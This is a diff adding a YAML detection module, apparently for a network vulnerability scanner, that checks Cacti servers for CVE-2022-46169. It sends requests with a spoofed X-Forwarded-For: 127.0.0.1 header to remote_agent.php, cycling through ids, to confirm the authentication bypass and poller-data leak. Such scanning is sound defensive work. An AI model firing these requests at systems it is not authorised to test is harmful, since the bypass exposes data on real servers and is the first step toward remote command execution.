@@ -1,0 +1,54 @@
+info:
+  name: cacti_cve_2022_46169_vuln
+  author: Sankalp Bansal
+  severity: 9.8
+  description: >
+    Cacti <= 1.2.22 - Unauthenticated Remote Command Injection. The vulnerability
+    allows an unauthenticated user to bypass authentication via a specific
+    X-Forwarded-For header. Successful bypass results in the leakage of poller data,
+    which is a prerequisite for the RCE.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-46169
+    - https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
+    - https://security-tracker.debian.org/tracker/CVE-2022-46169
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve_2022
+    - cacti
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          X-Forwarded-For: "127.0.0.1"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/remote_agent.php?action=polldata&local_data_ids[]={{ids}}&host_id={{ids}}&poller_id={{ids}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              ids: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: '"value":[\s\S]*"local_data_id":|"local_data_id":[\s\S]*"value":'
+              reverse: false
